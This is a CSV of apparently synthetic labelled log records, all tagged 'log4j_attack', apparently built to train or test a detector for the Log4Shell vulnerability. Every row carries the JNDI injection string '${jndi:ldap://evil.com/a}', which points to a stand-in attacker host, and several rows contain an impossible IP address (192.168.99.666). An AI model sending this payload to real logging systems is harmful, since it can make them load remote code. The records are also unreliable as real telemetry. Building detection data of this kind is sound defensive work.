timestamp,src_ip,dst_ip,process_name,file_hash,signature_status,outbound_conn_5min,dns_query,log_line,jndi_present,entropy,label
2025-11-28T06:19:56.015088,192.168.1.67,45.32.123.99,java.exe,937432d4cb572d3eb390182ea29349d93e4136ea24891565db49a593ba23d13d,Valid,37,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.203,log4j_attack
2025-11-28T06:19:56.015103,192.168.1.85,104.21.45.67,java.exe,5431be44129fc3c6848d52cb1ab32d07b9d64a7b6fd22012461efde7da077521,Valid,41,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.974,log4j_attack
2025-11-28T06:19:56.015120,192.168.1.51,185.199.108.33,java.exe,13b7f13b4cf5c23878676fbf1745304da339431a86b1661c66cc9f17ac05d2e4,Valid,47,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.482,log4j_attack
2025-11-28T06:19:56.015136,192.168.1.116,192.168.99.666,java.exe,28ccd68ccd94ef3514aba40f67f5108726c1ee075c365095ed26fb5b905274cc,Valid,57,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.438,log4j_attack
2025-11-28T06:19:56.015153,192.168.1.224,185.199.108.33,java.exe,76de5186c724c71d8753f923b2942d7aab24e082b8453548ceea116a76282697,Valid,25,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.258,log4j_attack
2025-11-28T06:19:56.015169,192.168.1.116,45.32.123.99,java.exe,3a3e9912d414a7e2489e649ce0a51567b83faa5b0915ae8dce9de9a5628e71ec,Valid,21,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.242,log4j_attack
2025-11-28T06:19:56.015185,192.168.1.108,185.199.108.33,java.exe,64b0d1dcad1c2440a6b7575cc4f1390e670fcf70abcfd1453baa6e468f100182,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.455,log4j_attack
2025-11-28T06:19:56.015203,192.168.1.76,185.45.67.88,java.exe,ae409421cd93b155044f0a0eab00b64fafd5d1bb4bdeab013cdf292540cd02cb,Valid,59,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.198,log4j_attack
2025-11-28T06:19:56.015221,192.168.1.104,104.21.45.67,java.exe,61d4d3281d57aa39841e29c25edf2ffeb1c69811a7f8579039cf148ed216862e,Valid,38,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.998,log4j_attack
2025-11-28T06:19:56.015237,192.168.1.189,185.45.67.88,java.exe,524ae8727840dffb2c5e33452262327093c1acacaa35c35283d335da3052b28a,Valid,33,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.2,log4j_attack
2025-11-28T06:19:56.015253,192.168.1.71,45.32.123.99,java.exe,100164e498de413d36112c1b7f3682c337afb47feaf8cf07675c3bc345363ddd,Valid,53,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.904,log4j_attack
2025-11-28T06:19:56.015270,192.168.1.218,185.45.67.88,java.exe,fb6a29a2bf9dd8129407bf1ceb26cfbd1100886c84c4ccf341d428a9e51f2749,Valid,57,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.268,log4j_attack
2025-11-28T06:19:56.015287,192.168.1.125,45.32.123.99,java.exe,af3ec08e4ed68051b3fa9f7c3fefd077e9e06310199442a86831d7451db728ce,Valid,65,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.807,log4j_attack
2025-11-28T06:19:56.015304,192.168.1.149,192.168.99.666,java.exe,18561b5c23af81c5e0b1ac2d6872c2446c84dfda16a92121cc4e1c44a08df514,Valid,47,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.217,log4j_attack
2025-11-28T06:19:56.015320,192.168.1.36,104.21.45.67,java.exe,f97346930dfb8473959027788043334821ddda868434d245acb3aed3bb0e2119,Valid,35,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.066,log4j_attack
2025-11-28T06:19:56.015343,192.168.1.122,185.199.108.33,java.exe,f17c0a473cf974032563f8909b353fbccad64562156b438b5416c6bec8e3939b,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.058,log4j_attack
2025-11-28T06:19:56.015361,192.168.1.178,104.21.45.67,java.exe,4c86b3ccf272047c8f3ddae907b74a518765233a5522792fa40cacd1c1d09f19,Valid,46,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.5,log4j_attack
2025-11-28T06:19:56.015378,192.168.1.137,104.21.45.67,java.exe,a5c9ac3aa409509d2b8e5635934883e221d1137249e1e9ba7a322b55896599bb,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.252,log4j_attack
2025-11-28T06:19:56.015395,192.168.1.179,45.32.123.99,java.exe,a1e84acc8621f68217ba74356e08a3699da2eb4a4517edc663341a174bd736c8,Valid,55,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.843,log4j_attack
2025-11-28T06:19:56.015412,192.168.1.129,192.168.99.666,java.exe,fbb2fd48f4479690b12e008400622cd2e976c543378a2b81f6ee6d230f79a61f,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.35,log4j_attack
2025-11-28T06:19:56.015429,192.168.1.27,192.168.99.666,java.exe,30286d966395d4f68349305c604e35034acd823c7993208c9be05a9352eb48bc,Valid,60,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.22,log4j_attack
2025-11-28T06:19:56.015446,192.168.1.131,185.199.108.33,java.exe,30fa48e5d279ee5666951b33cc6748b4c8b56a311fb643bd3289f43f7a9f4584,Valid,38,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.446,log4j_attack
2025-11-28T06:19:56.015462,192.168.1.29,185.199.108.33,java.exe,a6d0f329c960dfbbaa5a426c2536b2e497688c709082b457030dfe7c2b8fc9fe,Valid,61,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.364,log4j_attack
2025-11-28T06:19:56.015480,192.168.1.161,185.199.108.33,java.exe,9140139d1b64e6e635cc85682cbf8b572cebc4355b67c90849650db046bf30a6,Valid,49,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.266,log4j_attack
2025-11-28T06:19:56.015497,192.168.1.82,192.168.99.666,java.exe,45135ba7dad856d7505616b5eb584f2ce595dc93c989407c2c3a3aca0392aced,Valid,32,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.912,log4j_attack
2025-11-28T06:19:56.015513,192.168.1.170,45.32.123.99,java.exe,0069ab801309981f971c487764b8327ddd5aea8fd53adfadf604833c2ed00f84,Valid,52,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.388,log4j_attack
2025-11-28T06:19:56.015529,192.168.1.178,185.45.67.88,java.exe,d51bdb6f9e4e313cd4721bf05508854ee4df87fbc7a149e2abcc853ff09842a4,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.164,log4j_attack
2025-11-28T06:19:56.015545,192.168.1.12,185.45.67.88,java.exe,79a12ceba33403d6459f03092876544bdaeff83d2d87d90beee6769b80474ec0,Valid,37,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.803,log4j_attack
2025-11-28T06:19:56.015561,192.168.1.188,192.168.99.666,java.exe,f94b2fb7eb6158bf5724b7b5e132c6470b12ec5b0b08ad2c0dbb7a8a2d95ddc6,Valid,43,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.177,log4j_attack
2025-11-28T06:19:56.015578,192.168.1.248,192.168.99.666,java.exe,583c2ec0742119fed3f1e477eef4c45eaf583dd223b140dbca89648e11290e7b,Valid,62,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.382,log4j_attack
2025-11-28T06:19:56.015595,192.168.1.160,185.199.108.33,java.exe,7f620435d3f1b39b6c15b35eb60fd8cbf0532685c4d1e4de2c41b14c23af67cb,Valid,29,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.025,log4j_attack
2025-11-28T06:19:56.015614,192.168.1.99,104.21.45.67,java.exe,46007be0f1292617a981ea55d1c5936034089fc3f379c7dda82a773aaa18334b,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.08,log4j_attack
2025-11-28T06:19:56.015631,192.168.1.33,45.32.123.99,java.exe,5b3ef05721c44f90c29ac1baac72b61fb78759a8a769881584b5cbc068fa12cf,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.037,log4j_attack
2025-11-28T06:19:56.015648,192.168.1.68,192.168.99.666,java.exe,3c2a534ad4b4ff2724c641d2ddc21f5a99d3637c2a0208244d57d547aac7eae4,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.175,log4j_attack
2025-11-28T06:19:56.015665,192.168.1.165,192.168.99.666,java.exe,3afead22bcbb763bb738d5ba5f1969ddf4e475c7c24da540fd390b228de00fef,Valid,55,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.046,log4j_attack
2025-11-28T06:19:56.015681,192.168.1.16,185.45.67.88,java.exe,a619a2182e88cf6be229d9742198ad1356b808fabaae3f301eda9dde1cf4a34a,Valid,55,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.445,log4j_attack
2025-11-28T06:19:56.015698,192.168.1.38,104.21.45.67,java.exe,b4144c9bed2c18ff3652e9937632fdd10f817bb228d3be8c7e04a953a0b95a02,Valid,33,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.498,log4j_attack
2025-11-28T06:19:56.015713,192.168.1.93,192.168.99.666,java.exe,7a806c71909a48abf193e0657cfbc15a3cdf19c2e69f65f3cec0971637855ead,Valid,26,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.899,log4j_attack
2025-11-28T06:19:56.015729,192.168.1.236,104.21.45.67,java.exe,5b8778b2020212cf13751c00688f1e93fc927db63675fa9b5836ec1be2b64275,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.878,log4j_attack
2025-11-28T06:19:56.015745,192.168.1.22,185.199.108.33,java.exe,224d036e0dde1181112343ab3e9b15b1a3d43c3da9492e64bfc5a73c4a7cf7aa,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.08,log4j_attack
